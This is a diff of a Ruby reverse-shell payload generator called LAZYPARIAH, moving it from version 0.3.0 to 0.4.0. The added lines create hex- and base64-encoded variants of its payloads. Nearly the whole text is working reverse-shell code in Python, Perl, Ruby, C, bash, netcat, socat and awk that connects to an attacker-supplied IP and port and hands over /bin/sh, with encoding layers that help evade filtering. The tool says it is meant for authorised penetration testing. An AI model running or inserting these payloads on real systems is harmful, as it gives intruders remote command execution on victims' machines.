@@ -1,7 +1,7 @@
 #!/usr/bin/env ruby
 #
 # Title: LAZYPARIAH
-# Version: 0.3.0
+# Version: 0.4.0
 # Description:
 #	LAZYPARIAH is a simple tool for generating various reverse shell payloads
 #	on the fly. It is intended to be used only in authorised circumstances by
@@ -29,7 +29,7 @@ require "stringio"
 
 # Define constants.
 PROGRAM_NAME = "LAZYPARIAH".freeze()
-PROGRAM_VERSION = "0.3.0".freeze()
+PROGRAM_VERSION = "0.4.0".freeze()
 EXECUTABLE_NAME = "lazypariah".freeze()
 
 # Define payload list.
@@ -41,6 +41,9 @@ PAYLOAD_LIST = [
 	"python3_b64",
 	"python2_b64",
 	"python_b64",
+	"python3_hex",
+	"python2_hex",
+	"python_hex",
 	"nc",
 	"nc_pipe",
 	"php_fd_3",
@@ -57,9 +60,12 @@ PAYLOAD_LIST = [
 	"php_fd_6_tags",
 	"perl",
 	"perl_c",
+	"perl_b64",
+	"perl_hex",
 	"ruby",
 	"ruby_c",
 	"ruby_b64",
+	"ruby_hex",
 	"bash_tcp",
 	"awk",
 	"socat",
@@ -68,8 +74,10 @@ PAYLOAD_LIST = [
 	"java_class_gzip_b64",
 	"c_binary",
 	"c_binary_b64",
+	"c_binary_hex",
 	"c_binary_gzip",
-	"c_binary_gzip_b64"
+	"c_binary_gzip_b64",
+	"c_binary_gzip_hex"
 ].sort()
 
 # Define function for displaying program information.
@@ -166,12 +174,21 @@ begin
 			when "python3_b64"
 				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
 				print_output("echo #{code} | base64 -d | python3", url_encode=url_encode)
+			when "python3_hex"
+				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
+				print_output("echo #{code} | xxd -p -r - | python3", url_encode=url_encode)
 			when "python2_b64"
 				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
 				print_output("echo #{code} | base64 -d | python2", url_encode=url_encode)
+			when "python2_hex"
+				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
+				print_output("echo #{code} | xxd -p -r - | python2", url_encode=url_encode)
 			when "python_b64"
 				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
 				print_output("echo #{code} | base64 -d | python", url_encode=url_encode)
+			when "python_hex"
+				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
+				print_output("echo #{code} | xxd -p -r - | python", url_encode=url_encode)
 			when "nc"
 				print_output("nc -e /bin/sh #{ARGV[1]} #{ARGV[2]}", url_encode=url_encode)
 			when "nc_pipe"
@@ -204,6 +221,12 @@ begin
 				print_output("use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", url_encode=url_encode)
 			when "perl_c"
 				print_output("perl -e 'use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", url_encode=url_encode)
+			when "perl_b64"
+				code = Base64.strict_encode64("use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};")
+				print_output("echo #{code} | base64 -d | perl", url_encode=url_encode)
+			when "perl_hex"
+				code = "use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};".unpack("H*")[0]
+				print_output("echo #{code} | xxd -p -r - | perl", url_encode=url_encode)
 			when "ruby"
 				print_output("require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end", url_encode=url_encode)
 			when "ruby_c"
@@ -211,12 +234,15 @@ begin
 			when "ruby_b64"
 				code = Base64.strict_encode64("require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end")
 				print_output("echo #{code} | base64 -d | ruby", url_encode=url_encode)
+			when "ruby_hex"
+				code = "require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end".unpack("H*")[0]
+				print_output("echo #{code} | xxd -p -r - | ruby", url_encode=url_encode)
 			when "bash_tcp"
 				print_output("bash -i >& /dev/tcp/#{ARGV[1]}/#{ARGV[2]} 0>&1", url_encode=url_encode)
 			when "awk"
 				print_output("awk 'BEGIN {s = \"/inet/tcp/0/#{ARGV[1]}/#{ARGV[2]}\"; while(42) {do {printf \"[Awk Reverse Shell] >> \" |& s; s |& getline c; if (c) {while ((c |& getline) > 0) print $0 |& s; close(c);}} while (c != \"exit\") close(s);}}' /dev/null", url_encode=url_encode)
 			when "socat"
-				print_output("socat tcp-connect:#{ARGV[1]}:#{ARGV[2]} system:/bin/sh")
+				print_output("socat tcp-connect:#{ARGV[1]}:#{ARGV[2]} system:/bin/sh", url_encode=url_encode)
 			when "java_class_binary", "java_class_b64", "java_class_gzip_b64"
 				code = "import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class rs {public rs() throws Exception {Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();Socket s=new Socket(\"#{ARGV[1]}\",#{ARGV[2]});InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0) {so.write(pi.read());}while(pe.available()>0) {so.write(pe.read());}while(si.available()>0) {po.write(si.read());}so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;} catch (Exception e) {}}p.destroy();s.close();}}"
 
@@ -246,7 +272,7 @@ begin
 				end
 
 				system("rm -r #{temp_dir}")
-			when "c_binary", "c_binary_gzip", "c_binary_b64", "c_binary_gzip_b64"
+			when "c_binary", "c_binary_gzip", "c_binary_b64", "c_binary_gzip_b64", "c_binary_hex", "c_binary_gzip_hex"
 				code = "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\nint main(void){int port = #{ARGV[2]};struct sockaddr_in revsockaddr;int sockt = socket(AF_INET, SOCK_STREAM, 0);revsockaddr.sin_family = AF_INET;revsockaddr.sin_port = htons(port);revsockaddr.sin_addr.s_addr = inet_addr(\"#{ARGV[1]}\");connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));dup2(sockt, 0);dup2(sockt, 1);dup2(sockt, 2);char * const argv[] = {\"/bin/sh\", NULL};execve(\"/bin/sh\", argv, NULL);\nreturn 0;}"
 
 				temp_dir = IO.popen("mktemp -dt lazypariah_XXXXXXXX").read().chomp()
@@ -261,7 +287,10 @@ begin
 						print_output(binary_payload)
 					when "c_binary_b64"
 						binary_payload_b64 = Base64.strict_encode64(binary_payload)
-						print_output(binary_payload_b64)
+						print_output(binary_payload_b64, url_encode=url_encode)
+					when "c_binary_hex"
+						binary_payload_hex = binary_payload.unpack("H*")[0]
+						print_output(binary_payload_hex)
 					when "c_binary_gzip"
 						sio = StringIO.new()
 						sio.binmode()
@@ -269,7 +298,7 @@ begin
 						gz.write(binary_payload)
 						gz.close()
 						binary_payload_gzip = sio.string
-						print_output(binary_payload_gzip, url_encode)
+						print_output(binary_payload_gzip)
 					when "c_binary_gzip_b64"
 						sio = StringIO.new()
 						sio.binmode()
@@ -279,6 +308,15 @@ begin
 						binary_payload_gzip = sio.string
 						binary_payload_gzip_b64 = Base64.strict_encode64(binary_payload_gzip)
 						print_output(binary_payload_gzip_b64, url_encode=url_encode)
+					when "c_binary_gzip_hex"
+						sio = StringIO.new()
+						sio.binmode()
+						gz = Zlib::GzipWriter.new(sio)
+						gz.write(binary_payload)
+						gz.close()
+						binary_payload_gzip = sio.string
+						binary_payload_gzip_hex = binary_payload_gzip.unpack("H*")[0]
+						print_output(binary_payload_gzip_hex)
 					end
 				end
 
